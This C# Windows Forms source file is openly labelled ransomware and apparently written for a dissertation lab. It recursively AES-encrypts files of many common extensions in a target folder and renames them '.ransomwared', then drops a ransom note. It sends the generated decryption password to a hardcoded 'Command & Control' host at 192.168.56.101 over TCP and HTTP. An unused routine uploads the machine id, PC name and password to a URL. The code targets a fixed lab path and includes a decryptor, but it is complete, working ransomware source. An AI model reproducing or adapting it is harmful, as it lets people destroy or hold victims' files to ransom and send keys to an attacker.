using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace Ransomware
{
    public partial class Form1 : Form
    {
        TcpClient clientTCP;
        NetworkStream streamTCP;
        string password;

        public Form1()
        {
            InitializeComponent();
        }

        private static readonly HttpClient client = new HttpClient();

        private static async Task SendPassword(string password)
        {
            var data = new StringContent("Password for Decryption: " + password, Encoding.UTF8, "application/x-www-form-urlencoded");
            var response = await client.PostAsync("http://192.168.56.101:8000", data);
            var responseString = await response.Content.ReadAsStringAsync();
            //Console.WriteLine(responseString);
        }

        private async void btnEncrypt_Click(object sender, EventArgs e)
        {
            tbMes.Text += "Ransomware Started Successfully\r\n";
            await Task.Delay(100);
            
            password = PasswordGenerator(50);

            try
            {
                clientTCP = new TcpClient("192.168.56.101", 8080);
                streamTCP = clientTCP.GetStream();

                // Send a message to the server
                string message = "Hello, Command & Control server!";
                byte[] data = Encoding.UTF8.GetBytes(message);
                streamTCP.Write(data, 0, data.Length);
            }
            catch (Exception ex)
            {
                string s = ex.Message;
                File.WriteAllText("error_connection_log.txt", s);
            }

            try
            {
                await SendPassword(password);
            }
            catch (Exception ex)
            {
                string s = ex.Message;
                File.WriteAllText("error_connection2_log.txt", s);
            }

            Init();
            tbMes.Text += "DONE\r\n";
        }

        public void Init()
        {
            string path = "D:\\Aplicatie_Disertatie\\MyRansomware\\ToBeRansomwared";

            //SendPassword(password).Wait();

            EncryptFilesInDirectory(password, path);

            string text = "Your files have been encryted with Ransomware, password is " + password;

            System.IO.File.WriteAllText("D:\\Aplicatie_Disertatie\\MyRansomware\\ToUndoRansomwared\\ReadMeForDecryption.txt", text);
            //System.IO.File.WriteAllText((@userDir + "Desktop\\ReadmeForDecryption.txt"), text);
            //System.Windows.Forms.Application.Exit();
        }
        public static string PasswordGenerator(int passwordLength)
        {
            char[] possibleCharacters = new char[83];
            possibleCharacters = "<>/.,:-_=+}{[]()&*#@!ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz".ToCharArray();

            byte[] randomBytes = new byte[1];
            using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
            {
                cryptoServiceProvider.GetNonZeroBytes(randomBytes);
                randomBytes = new byte[passwordLength];
                cryptoServiceProvider.GetNonZeroBytes(randomBytes);
            }
            StringBuilder passwordBuilder = new StringBuilder(passwordLength);
            foreach (byte randomByte in randomBytes)
            {
                passwordBuilder.Append(possibleCharacters[randomByte % (possibleCharacters.Length)]);
            }
            return passwordBuilder.ToString();
        }
        public void EncryptFilesInDirectory(string encryptionPassword, string directoryPath)
        {
            var extensions = new[]
            {
                ".iso",".bat",".txt", ".doc", ".docx", ".pptx", ".odt", ".xls", ".xlsx", ".ppt",
                ".jpg", ".png", ".csv", ".sql", ".bak", ".php", ".asp", ".vb", ".mdb", ".sln",
                ".aspx", ".html", ".xml", ".psd", ".h", ".hpp", ".css", ".js", ".cpp",
                ".dwg", ".jar"
            };

            string[] filesInDirectory = Directory.GetFiles(directoryPath);
            string[] subDirectories = Directory.GetDirectories(directoryPath);
            for (int i = 0; i < filesInDirectory.Length; i++)
            {
                string fileExtension = Path.GetExtension(filesInDirectory[i]);
                if (extensions.Contains(fileExtension))
                {
                    EncryptSingleFile(filesInDirectory[i], encryptionPassword);
                }
            }
            for (int i = 0; i < subDirectories.Length; i++)
            {
                EncryptFilesInDirectory(encryptionPassword, subDirectories[i]);
            }
        }

        public void EncryptSingleFile(string file, string password)
        {
            byte[] originalFileBytes = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] encryptedBytes = PerformAESEncryption(originalFileBytes, passwordBytes);

            File.WriteAllBytes(file, encryptedBytes);
            System.IO.File.Move(file, file + ".ransomwared");
        }
        public byte[] PerformAESEncryption(byte[] encryptBytes, byte[] passBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged aesEncryptor = new RijndaelManaged())
                {
                    aesEncryptor.KeySize = 256;
                    aesEncryptor.BlockSize = 128;

                    var derivedKey = new Rfc2898DeriveBytes(passBytes, saltBytes, 1000);
                    aesEncryptor.Key = derivedKey.GetBytes(aesEncryptor.KeySize / 8);
                    aesEncryptor.IV = derivedKey.GetBytes(aesEncryptor.BlockSize / 8);
                    aesEncryptor.Mode = CipherMode.CBC;

                    using (var cryptoStream = new CryptoStream(memoryStream, aesEncryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptBytes, 0, encryptBytes.Length);
                        cryptoStream.Close();
                    }
                    encryptedBytes = memoryStream.ToArray();
                }
            }
            return encryptedBytes;
        }

        public void SendCandy(string identif, string pcName, string password, string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
            formData["Id_machine"] = identif;
            formData["pc_name"] = pcName;
            formData["pass"] = password;
            byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            webClient.Dispose();
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            DecryptFilesInDirectory("D:\\Aplicatie_Disertatie\\MyRansomware\\ToBeRansomwared");
            tbMes.Text += "\rUNRansomwared Everything Successfully";
        }

        public void DecryptFilesInDirectory(string folderPath)
        {
            string password = this.tbPassword.Text;

            string[] file = Directory.GetFiles(folderPath);
            string[] directory = Directory.GetDirectories(folderPath);
            for (int i = 0; i < file.Length; i++)
            {
                string ext = Path.GetExtension(file[i]);
                if (ext == ".ransomwared")
                {
                    DecryptSingleFile(password, file[i]);
                }
            }
            for (int i = 0; i < directory.Length; i++)
            {
                DecryptFilesInDirectory(directory[i]);
            }
        }
        public void DecryptSingleFile(string pass, string file)
        {
            byte[] bytesToDecrypt = File.ReadAllBytes(file);
            byte[] password = Encoding.UTF8.GetBytes(pass);
            password = SHA256.Create().ComputeHash(password);

            byte[] decryptedBytes = PerformAESDecryption(password, bytesToDecrypt);

            File.WriteAllBytes(file, decryptedBytes);
            string ext = System.IO.Path.GetExtension(file);
            string outpout = file.Substring(0, file.Length - ext.Length);
            System.IO.File.Move(file, outpout);

        }
        public byte[] PerformAESDecryption(byte[] password, byte[] bytestoDecrypt)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (RijndaelManaged aesDecryptor = new RijndaelManaged())
                {
                    aesDecryptor.KeySize = 256;
                    aesDecryptor.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(password, saltBytes, 1000);
                    aesDecryptor.Key = key.GetBytes(aesDecryptor.KeySize / 8);
                    aesDecryptor.IV = key.GetBytes(aesDecryptor.BlockSize / 8);
                    aesDecryptor.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(memoryStream, aesDecryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytestoDecrypt, 0, bytestoDecrypt.Length);
                        cs.Close();
                    }
                    decryptedBytes = memoryStream.ToArray();
                }
            }
            return decryptedBytes;
        }
    }
}
